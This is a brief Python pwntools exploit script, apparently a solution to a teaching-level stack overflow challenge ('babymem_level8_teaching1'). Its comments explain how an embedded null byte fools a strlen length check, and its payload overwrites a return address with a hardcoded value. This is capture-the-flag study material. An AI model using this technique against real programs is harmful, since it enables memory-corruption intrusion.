#!/usr/bin/env python3

from pwn import *

context.update(arch='amd64', os='linux') # set arch
#context.terminal = ['mate-terminal', '-e'] # set terminal

p = process('/babymem_level8_teaching1')
# we can malloc on the heap any space we want, but later the input we send
# to the malloced space is memcpy to a 84 bytes sized allocated in the stack
p.sendline('182') # 182 bytes is more than enought to overflow later

# the magic is to send a null byte in the middle of the input because when
# the validation code checks strlen in the malloced space for the size, will stop
# at the null byte and get the wrong size for the input
# 
# # will return 82, but the input is 184
# length_malloced_size = strlen(malloced_input);
# if (0x53 < length_malloced_size) {
#     __assert_fail("string_length < 84");
# } # 0x0000
overflow = ('A' * 82) + '\0' + ('B' * 53) + ('\x9e\x1b\xa0\xe3\x19\x56\x00\x00') # ('C' * 8) #cyclic(82)
p.sendline(overflow)
p.interactive()
